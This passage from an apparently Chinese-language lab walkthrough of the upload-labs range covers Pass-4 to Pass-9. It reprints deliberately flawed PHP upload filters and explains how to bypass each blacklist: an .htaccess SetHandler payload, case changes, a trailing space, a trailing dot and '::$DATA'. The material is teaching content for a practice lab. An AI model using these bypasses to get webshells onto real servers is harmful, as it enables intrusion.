class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728</span></span><br></pre></td></tr></table></figure>

<p>黑名单拒绝了几乎所有有问题的后缀名，除了.htaccess<br>前提条件（<code>1.mod_rewrite模块开启。2.AllowOverride All</code>）<br>因此先上传一个.htaccess文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>这样所有文件都会当成php来解析<br><img src="https://img-blog.csdnimg.cn/20190619210642615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619210904393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619210924251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-5-大小写绕过"><a href="#Pass-5-大小写绕过" class="headerlink" title="Pass-5-大小写绕过"></a>Pass-5-大小写绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure>

<p>相比于pass-4，过滤了.htaccess，但将后缀转换为小写去掉了，因此可以使用大小绕过<br><img src="https://img-blog.csdnimg.cn/2019061821314398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618213222393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-6-空格绕过"><a href="#Pass-6-空格绕过" class="headerlink" title="Pass-6-空格绕过"></a>Pass-6-空格绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure>

<p>相比于前两题，这题没有对后缀名进行去空，因此可以在后缀名加空格绕过<br><img src="https://img-blog.csdnimg.cn/20190618213558104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618213634557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-7-点绕过"><a href="#Pass-7-点绕过" class="headerlink" title="Pass-7-点绕过"></a>Pass-7-点绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure>

<p>没有对后缀名末尾的点进行处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：<br><img src="https://img-blog.csdnimg.cn/20190618214054814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618214120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-8-DATA绕过"><a href="#Pass-8-DATA绕过" class="headerlink" title="Pass-8-::$DATA绕过"></a>Pass-8-::$DATA绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure>

<p>没有对后缀名中的’::$DATA’进行过滤。在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。利用windows特性，可在后缀名中加” ::$DATA”绕过：<br><img src="https://img-blog.csdnimg.cn/20190618215039848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618215110311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-9-点-空格-点绕过"><a href="#Pass-9-点-空格-点绕过" class="headerlink" title="Pass-9-点+空格+点绕过"></a>Pass-9-点+空格+点绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span 